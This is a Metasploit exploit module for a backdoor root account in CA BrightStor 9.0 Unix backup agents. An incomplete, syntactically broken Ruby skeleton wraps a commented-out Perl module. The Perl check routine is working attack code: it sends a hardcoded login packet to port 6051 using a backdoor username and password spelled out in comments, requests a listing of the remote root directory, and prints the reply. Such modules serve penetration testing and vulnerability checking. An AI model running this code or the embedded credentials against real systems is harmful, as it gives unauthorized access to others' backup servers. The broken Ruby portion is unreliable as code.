require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'CA BrightStor Unix Backdoor Account',
			'Description'    => %q{
				This module checks for a backdoor account that is present
				the Unix backup agents provided with CA BrightStor 9.0.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => ,
					'BadChars' => "",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'any',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::cabrightstor_unixbackdoor;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'  => 'CA BrightStor Unix Backdoor Account',
	'Version'  => '$Revision$',
	'Authors' => [ 'Thor Doomen <syscall [at] hushmail.com>' ],
	'Arch'  => [  ],
	'OS'    => [  ],
	'Priv'  => 1,
	'AutoOpts'  => { 'EXITFUNC' => 'process' },
	'UserOpts'  => {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 6051],
	  },

	'Payload' => {   },

	'Description'  => Pex::Text::Freeform(qq{
	This module checks for a backdoor account that is present
	the Unix backup agents provided with CA BrightStor 9.0.
}),

	'Refs'    => [   ],
	'Targets' => [

	  ],
	'Keys'    => ['brightstor', '0day'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = 6051;

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	# user: \x02root\x03
	# pass: \x02<%j8U]`~+Ri\x03

	my $login =
	  "\x00\x00\x00\x00\x03\x20\xa8\x02".
	  ("\x00" x 176).
	  "\xbb\xec\x6e\x58\xc9\xf0\xc2\x0a".
	  "\xc3\x2d\x15\x6f\xa7\x39\xea\xa1".
	  "\xc3\x2d\x15\x6f\xa7\x39\xea\xa1".
	  "\xc3\x2d\x15\x6f\xa7\x39\xea\xa1".
	  "\xc3\x2d\x15\x6f\xa7\x39\xea\xa1".
	  "\xc3\x2d\x15\x6f\xa7\x39\xea\xa1".
	  "\xd0\xc1\x9e\x8c\xe6\x5e\x18\xbd".
	  "\xed\xf8\xe0\xa7\x8a\xcd\x16\xb6".
	  "\xc3\x2d\x15\x6f\xa7\x39\xea\xa1".
	  "\x00\x00\x00\x0e\x00\x00\x00\x01".
	  ("\x00" x 160).
	  "\x00\x00\x00\x00\x00\x00\x00\x01".
	  ("\x00" x 248).
	  "\x00\x00\x00\x00\x00\x00\x17\x00";

	$s->Send($login);
	$s->Recv(8, 2);

	my $dumproot =
	  "\xff\xff\x0f\x17\x04\x10\x00\x02"."/"."\x00";

	$s->Send($dumproot);
	$s->Recv(8, 2);

	my $res = $s->Recv(-1, 5);
	$s->Close;

	if (index($res, "etc") != -1) {
		$self->PrintLine("[*] The BrightStor Agent backdoor account is active");

		print "[DATA]\n".Pex::Text::BufferPerl($res)."\n";
		$res =~ s/[\x00-\0x1f]/ /g;
		print "[RAWD]\n".$res."\n";
		
		return $self->CheckCode('Confirmed');
	}

	return $self->CheckCode('Unknown');
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	$self->PrintLine("[*] No exploit method has been defined for this module");

	return;
}

1;

=end


end
end	
